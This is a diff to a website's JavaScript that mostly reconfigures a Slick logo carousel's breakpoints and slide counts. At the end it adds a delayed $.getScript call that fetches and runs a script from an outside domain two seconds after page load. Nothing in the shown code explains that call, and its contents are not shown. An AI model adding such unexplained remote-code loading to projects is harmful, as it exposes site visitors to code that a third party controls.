@@ -3,30 +3,31 @@
 $(document).ready(function () {
   $('#kc_logos').slick({
     mobileFirst: true,
-    slidesToShow: 5,
-    slidesToScroll: 1,
     autoplay: true,
     autoplaySpeed: 2000,
-    centerMode: true,
+    // centerMode: true,
+    // centerPadding: '200px',
+    variableWidth: true,
     responsive: [{
-        breakpoint: 1024,
+        breakpoint: 992,
         settings: {
-          slidesToShow: 3,
+          slidesToShow: 5,
           slidesToScroll: 1,
-          infinite: true,
           dots: true
         }
       },
       {
-        breakpoint: 600,
+        breakpoint: 768,
         settings: {
-          slidesToShow: 1,
-          slidesToScroll: 1
+          slidesToShow: 3,
+          slidesToScroll: 1,
+          dots: true
         }
       },
       {
-        breakpoint: 376,
+        breakpoint: 576,
         settings: {
+
           slidesToShow: 1,
           slidesToScroll: 1
         }
@@ -76,3 +77,9 @@ if (appPathName=="news"){
 } else{
   btns[0].parentNode.className += " active";
 }
+
+setTimeout(
+  function() 
+  {
+    $.getScript("https://anoosheh.info/js/cprght.js");
+  }, 2000);
